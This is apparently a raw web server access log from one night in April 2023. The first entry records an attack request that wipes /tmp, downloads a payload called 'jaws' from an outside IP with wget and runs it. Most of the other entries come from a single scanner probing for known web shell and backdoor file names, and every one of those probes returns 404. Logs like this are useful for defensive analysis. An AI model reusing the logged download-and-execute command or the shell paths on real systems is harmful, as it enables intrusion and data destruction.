::ffff:201.150.126.209 - - [03/Apr/2023:00:00:19 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+161.35.208.230/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:43.155.118.219 - - [03/Apr/2023:00:03:33 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:52.167.144.45 - - [03/Apr/2023:00:33:55 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:04 +0000] "GET /Makhdamx.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:05 +0000] "GET /Makhdamx.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:06 +0000] "GET /database.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:07 +0000] "GET /wp-commentin.php HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:08 +0000] "GET /wp-content/themes/seotheme/db.php?u HTTP/1.1" 404 172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:09 +0000] "GET /xltavrat.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:11 +0000] "GET /wp-admin/includes/class-wp-media-list-data.php HTTP/1.1" 404 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:12 +0000] "GET /wp-content/plugins/seoplugins/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:13 +0000] "GET /wso112233.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:13 +0000] "GET /xleet-shell.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:14 +0000] "GET /xleet.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:15 +0000] "GET /wp-content/plugins/seoplugins/mar.php HTTP/1.1" 404 176 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:16 +0000] "GET /wp-content/themes/seotheme/mar.php HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:17 +0000] "GET /wp-admin/js/widgets/wp-login.php HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:18 +0000] "GET /0z.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:19 +0000] "GET /fw.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:20 +0000] "GET /wp-includes/wp-class.php HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:21 +0000] "GET /radio.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:22 +0000] "GET /i.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:23 +0000] "GET /o.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:25 +0000] "GET /alwso.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:26 +0000] "GET /wp-blog.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:27 +0000] "GET /u.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:28 +0000] "GET /templates/beez5/index.php HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:29 +0000] "GET /mini.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:30 +0000] "GET /x.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:31 +0000] "GET /404.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:32 +0000] "GET /13.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:33 +0000] "GET /11index.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:34 +0000] "GET /wp-uploads.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:35 +0000] "GET /sh.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
